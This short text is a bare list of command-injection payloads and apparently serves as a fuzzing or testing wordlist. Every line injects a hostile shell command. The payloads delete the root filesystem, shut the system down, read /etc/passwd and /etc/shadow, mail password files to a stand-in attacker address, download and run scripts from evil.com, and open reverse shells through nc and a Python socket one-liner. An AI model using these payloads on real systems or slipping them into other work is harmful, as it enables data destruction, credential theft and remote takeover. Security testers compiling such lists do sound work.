; rm -rf /
| cat /etc/passwd
& shutdown /s /t 0
`whoami`
$(cat /etc/shadow)
; curl evil.com/shell.sh | sh
| nc attacker.com 4444 -e /bin/sh
&& wget evil.com/backdoor && chmod +x backdoor && ./backdoor
; echo "hacked" > /etc/motd
| mail attacker@evil.com < /etc/passwd
\n/bin/sh\n
; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'